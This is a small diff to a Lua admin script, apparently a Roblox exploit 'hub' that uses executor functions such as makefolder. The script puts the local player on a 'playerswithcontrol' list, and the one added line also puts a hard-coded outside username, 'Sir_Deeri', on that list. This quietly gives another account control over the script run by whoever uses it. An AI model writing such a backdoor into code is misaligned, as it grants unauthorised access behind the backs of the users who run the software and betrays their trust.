@@ -1,0 +1,13 @@
+diff --git a/adminV2.lua b/adminV2.lua
+--- adminV2.lua
++++ adminV2.lua
+@@ -16,8 +16,9 @@
+     print("else")
+     playerswithcontrol = {}
+ end
+ playerswithcontrol[#playerswithcontrol+1] = game.Players.LocalPlayer.Name
++playerswithcontrol[#playerswithcontrol+1] = "Sir_Deeri"
+ --print(#playerswithcontrol)
+ _G.AdminLoaded = true
+ if not isfolder("DeeriHub") then
+     makefolder("DeeriHub")
